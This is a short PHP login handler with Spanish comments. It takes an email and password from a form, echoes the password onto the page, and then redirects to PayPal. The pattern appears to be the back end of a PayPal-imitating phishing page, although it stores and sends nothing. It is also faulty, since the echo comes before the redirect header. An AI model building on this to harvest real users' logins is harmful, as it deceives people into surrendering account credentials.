<?php
// login.php

// Verifica si el formulario ha sido enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Escapar datos para evitar inyecciones
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    echo "<p>Email: " . $email . "</p>";
    echo "<p>Contraseña: " . $password . "</p>";

    // Redirige a PayPal después de procesar los datos
    header('Location: https://www.paypal.com');
    exit();
} else {
    // Si no se ha enviado el formulario, redirigir a la página del formulario
    header('Location: Index.html');
    exit();
}
?>
